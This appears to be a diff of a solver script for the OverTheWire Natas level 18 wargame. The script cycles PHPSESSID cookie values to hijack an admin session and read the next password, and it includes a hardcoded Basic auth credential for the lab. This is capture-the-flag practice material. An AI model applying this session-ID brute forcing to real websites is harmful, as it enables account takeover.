@@ -18,11 +18,10 @@ def test_id(session_id):
         'Authorization': 'Basic bmF0YXMxODo4TkVEVVV4ZzhrRmdQVjg0dUx3dlprR242b2tKUTZhcQ==',
         'Cache-Control': 'max-age=0',
         'Connection': 'keep-alive',
-        'Cookie': f'PHPSESSID=0',
+        'Cookie': f'PHPSESSID={session_id}',
         'Upgrade-Insecure-Requests': '1',
         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36'
     }
-    headers['Cookie'] = f'PHPSESSID={session_id}'
     result = requests.get('http://natas18.natas.labs.overthewire.org/index.php', headers=headers)
     if 'Login as an admin' not in result.text:
         start = result.text.find('Password: ')
@@ -61,7 +60,6 @@ def solve(driver, _ = None):
     else:
         raise Exception('No solving session id found')
     
-    print()
     if driver: driver.get(build_url(password = password, level=19))
     return password
 
